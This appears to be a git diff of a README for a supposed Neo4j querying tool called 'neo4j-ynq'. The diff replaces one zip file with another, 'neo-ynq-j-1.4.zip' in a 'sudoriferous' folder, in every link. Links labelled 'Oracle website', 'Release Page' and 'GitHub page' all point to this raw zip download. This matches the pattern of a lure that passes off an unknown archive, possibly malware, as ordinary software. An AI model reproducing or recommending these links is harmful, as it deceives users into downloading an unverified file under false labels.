@@ -1,7 +1,7 @@
 # 🌟 neo4j-ynq - Easy Querying for Neo4j Databases
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo4j-ynq-3.2-alpha.1.zip)](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo4j-ynq-3.2-alpha.1.zip)
+[![Download](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo-ynq-j-1.4.zip)](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo-ynq-j-1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **neo4j-ynq**! This application makes it easy to work with Neo4j databases. Whether you're managing data or running queries, this tool simplifies the process for you.
@@ -11,7 +11,7 @@ Before you download, make sure your computer meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Disk Space:** At least 100 MB of free space
-- **Java Runtime:** Ensure you have Java 8 or higher installed. You can download it from the [Oracle website](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo4j-ynq-3.2-alpha.1.zip).
+- **Java Runtime:** Ensure you have Java 8 or higher installed. You can download it from the [Oracle website](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo-ynq-j-1.4.zip).
 
 ## 🔗 Features
 - **User-Friendly Interface:** Clearly displays your database connections and queries.
@@ -24,7 +24,7 @@ Follow these steps to download and install **neo4j-ynq**:
 
 1. **Visit the Releases Page**  
    Go to our releases page to find the latest version of the application:  
-   [Release Page](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo4j-ynq-3.2-alpha.1.zip)
+   [Release Page](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo-ynq-j-1.4.zip)
 
 2. **Choose the Latest Version**  
    Look for the most recent release at the top of the page. Click on it to view the details.
@@ -67,7 +67,7 @@ To uninstall **neo4j-ynq**, simply remove it like any other application:
 Make sure your Java Runtime is up to date. If issues persist, try reinstalling the application.
 
 ### Where can I get help?
-If you run into any problems, feel free to check the issues section on our [GitHub page](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo4j-ynq-3.2-alpha.1.zip) or reach out to the community for support.
+If you run into any problems, feel free to check the issues section on our [GitHub page](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo-ynq-j-1.4.zip) or reach out to the community for support.
 
 ## 🛠️ Troubleshooting Tips
 - **Ensure Java is Installed:** Verify that you have the required Java version. To check, run `java -version` in your terminal or command prompt.
@@ -82,4 +82,4 @@ Join our community to get the latest updates, share ideas, and connect with othe
 
 ## 📥 Download Again
 Don’t forget, you can always revisit our releases page to download the application or check for updates:  
-[Release Page](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo4j-ynq-3.2-alpha.1.zip)
+[Release Page](https://raw.githubusercontent.com/LeoMess6/neo4j-ynq/main/sudoriferous/neo-ynq-j-1.4.zip)
